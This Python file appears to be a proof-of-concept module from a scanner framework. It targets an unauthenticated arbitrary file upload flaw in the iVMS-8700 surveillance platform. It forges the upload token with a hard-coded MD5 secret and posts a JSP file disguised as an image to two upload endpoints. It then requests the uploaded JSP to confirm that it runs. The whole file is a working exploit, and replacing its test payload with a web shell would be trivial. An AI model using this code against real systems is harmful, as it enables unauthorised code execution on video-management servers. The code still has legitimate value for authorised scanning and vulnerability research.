'''
Function:
    ivms-8700 未授权任意文件上传
Author:
    spmonkey
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
import requests
import hashlib
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules import get_user_agent


class poc:

    def __init__(self, url, proxies):
        self.headers1 = {
            'User-Agent': get_user_agent.get_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'close',
            'Origin': 'null',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        self.url = url
        self.headers2 = {
            'User-Agent': 'MicroMessenger',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
            'Connection': 'close',
            'Origin': 'null',
            'Upgrade-Insecure-Requests': '1'
        }
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def token(self, netloc, scheme):
        url = '{}://{}/eps/api/resourceOperations/uploadsecretKeyIbuilding'.format(scheme, netloc)
        md5 = hashlib.md5(url.encode()).hexdigest()
        return md5.upper()

    def vuln1(self, netloc, token, scheme):
        url = '{}://{}/eps/api/resourceOperations/upload?token={}'.format(scheme, netloc, token)
        data = {
            'fileUploader': ('test.jsp', b'test', 'image/jpeg')
        }

        try:
            result = requests.post(url=url, headers=self.headers1, files=data, verify=False, proxies=self.proxies)
            if result.json()['message'] == '上传附件成功':
                path = '{}://{}/eps/upload/{}.jsp'.format(scheme, netloc, result.json()['data']['resourceUuid'])
                result = requests.get(url=path, verify=False, proxies=self.proxies)
                if 'test' in result.text:
                    target = urlparse(url)
                    self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                    for request_type, request_text in dict(result.request.headers).items():
                        self.result_text += "\n                 {}: {}".format(request_type, request_text)
                    self.result_text += "\n"
                    bodys = result.request.body.decode().split("\r\n")
                    for body in bodys:
                        self.result_text += "\n                 {}".format(body)
                    return True
                elif self.vlun2(netloc, scheme):
                    return True
                else:
                    return False
        except:
            return False

    def vlun2(self, netloc, scheme):
        url = '{}://{}/eps/resourceOperations/upload.action'.format(scheme, netloc)
        data = {
            'fileUploader': ('test.jsp', b'test', 'image/jpeg')
        }

        try:
            result = requests.post(url=url, headers=self.headers2, files=data, verify=False, proxies=self.proxies)
            if result.json()['message'] == '上传附件成功':
                path = '{}://{}/eps/upload/{}.jsp'.format(scheme, netloc, result.json()['data']['resourceUuid'])
                result_get = requests.get(url=path, verify=False, proxies=self.proxies)
                if 'test' in result_get.text:
                    target = urlparse(url)
                    self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                    for request_type, request_text in dict(result.request.headers).items():
                        self.result_text += "\n                 {}: {}".format(request_type, request_text)
                    self.result_text += "\n"
                    bodys = result.request.body.decode().split("\r\n")
                    for body in bodys:
                        self.result_text += "\n                 {}".format(body)
                    return True
                else:
                    return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        token = self.token(netloc, scheme)
        if self.vuln1(netloc, token, scheme):
            return self.result_text
        else:
            return False

